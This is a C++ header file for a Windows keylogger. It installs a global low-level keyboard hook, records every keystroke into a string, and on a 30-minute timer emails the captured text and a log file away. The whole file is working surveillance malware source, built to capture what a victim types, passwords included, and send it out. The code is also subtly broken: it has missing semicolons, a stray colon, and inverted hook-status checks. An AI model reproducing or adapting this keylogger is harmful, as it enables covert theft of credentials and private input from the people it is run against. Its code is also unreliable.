#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer-header.h"
#include "SendMail.h"


std::string keylog= //this will be a string var where all the keystrokes are stored after the mail is sent this var will be cleared, but mail is not succeed we won't clear the var but we try to send it again
void TimerSendMail()
{
    if(keylog.empty())
        return;
    std::string last_file=IO::WriteLog(keylog);

    if(last_file.empty())
    {
        Helper::WriteAppLog("File Creation wasn't successful. Keylog '"+keylog+"'");
        return;
    }

    int x=Mail::SendMail("Log ["+last_file+"]","Hi :)\nThe file has been attached to this mail :)\nFor testing, enjoy:\n"+keylog,IO::GetOurPath(true)+last_file);
    if(x!=7)
        Helper::WriteAppLog("Mail wasn't send. Error code: "+Helper::ToString(x));
    else
        keylog="";
}
Timer MailTimer(TimerSendMail, 500*60, Timer::Infinite);
HHOOK eHook=NULL; //ptr to our hook

//imp function of keylogger
LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)   //lparam and wparam is our parameter
{
    if(nCode<0)
        CallNextHookEx(eHook, nCode, wparam, lparam);
    KBDLLHOOKSTRUCT *kbs= (KBDLLHOOKSTRUCT *)lparam;
    if(wparam==WM_KEYDOWN || wparam==WM_SYSKEYDOWN) //checking when key is pressed like shift or ctrl key - long pressed
    {
        keylog+= Keys::KEYS[kbs->vkCode].Name; //this will append key to our string which will be saved to our file periodically and we are pulling this from KeyConstants.h
        if(kbs->vkCode==VK_RETURN)
            keylog+='\n';
    }
    else if(wparam==WM_KEYUP || wparam==WM_SYSKEYUP) //checking whether key is up means released //[SHIFT][a][b][c][/SHIFT]
    {
        DWORD key=kbs->vkCode;
        if(key==VK_CONTROL || key==VK_LCONTROL || key==VK_RCONTROL || key==VK_SHIFT || key==VK_RSHIFT || key== VK_LSHIFT || key==VK_MENU || key==VK_LMENU || key==VK_RMENU|| key==VK_CAPITAL || key==VK_NUMLOCK || key==VK_LWIN || key==VK_RWIN)
        { //[SHIFT][a][d][/SHIFT]
            std::string KeyName=Keys::KEYS[kbs->vkCode].Name;
            KeyName.insert(1,"/");
            keylog+=KeyName
        }
    }
    return CallNextHookEx(eHook, nCode, wparam, lparam);
}
//installing hook
bool InstallHook()
{
   Helper::WriteAppLog("Hook Started...Timer Started");
   MailTimer.Start(true);

   eHook=SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL),0); //WH_KEYBOARD_LL indicates we are using keyboard hook and LL means Low Level indicated that this is global hook //OurKeyboardProc is  procedure which will be invoked by hook system everytime user presses a key
   return eHook==NULL:
}

bool UninstallHook()
{
    BOOL b=UnhookWindowsHookEx(eHook);
    eHook=NULL;
    return (bool)b;
}
bool IsHooked()
{
    return(bool)(eHook==NULL);
}
#endif // KEYBHOOK_H
